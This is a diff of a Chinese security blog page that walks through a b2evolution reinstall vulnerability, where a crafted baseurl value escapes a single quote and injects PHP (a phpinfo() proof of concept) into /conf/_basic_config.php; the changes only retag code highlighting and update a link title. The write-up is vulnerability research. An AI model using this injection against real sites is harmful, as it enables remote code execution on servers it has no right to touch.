@@ -413,7 +413,7 @@
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"baseurl = '"</span>.str_replace( <span class="string">"'"</span>, <span class="string">"\'"</span>, $params[<span class="string">'baseurl'</span>] ).<span class="string">"';"</span></span><br></pre></td></tr></table></figure>
 <p>字符串baseurl处理后如下:<br><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span>localhost<span class="regexp">/b2evolution/</span>\\\<span class="string">';phpinfo();//</span></span><br></pre></td></tr></table></figure></p>
 <p>所以导致了单引号的逃逸，紧接着调用save_to_file存入/conf/_basic_config.php文件。</p>
-<p>4.打开/conf/_basic_config.php文件内容如下：<br><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$baseurl</span> = <span class="string">'http://localhost/b2evolution/\\'</span>;phpinfo();<span class="regexp">//</span><span class="string">';</span></span><br></pre></td></tr></table></figure></p>
+<p>4.打开/conf/_basic_config.php文件内容如下：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$baseurl = <span class="string">'http://localhost/b2evolution/\\'</span>;phpinfo();<span class="comment">//';</span></span><br></pre></td></tr></table></figure></p>
 <p>5.shell地址：<br><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span>localhost<span class="regexp">/b2evolution/</span></span><br></pre></td></tr></table></figure></p>
 <h2 id="0x03小结"><a href="#0x03小结" class="headerlink" title="0x03小结"></a>0x03小结</h2><p>这个漏洞需要在重装的时候才能利用，可以结合任意文件删除漏洞利用。</p>
 
@@ -458,8 +458,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2017/11/29/nginx_http_https/" rel="next" title="Nginx配置HTTPS与http运维实践">
-                <i class="fa fa-chevron-left"></i> Nginx配置HTTPS与http运维实践
+              <a href="/2017/11/29/nginx_http_https/" rel="next" title="Nginx配置HTTPS与http运维实践（2018-8-28更新）">
+                <i class="fa fa-chevron-left"></i> Nginx配置HTTPS与http运维实践（2018-8-28更新）
               </a>
             
           </div>
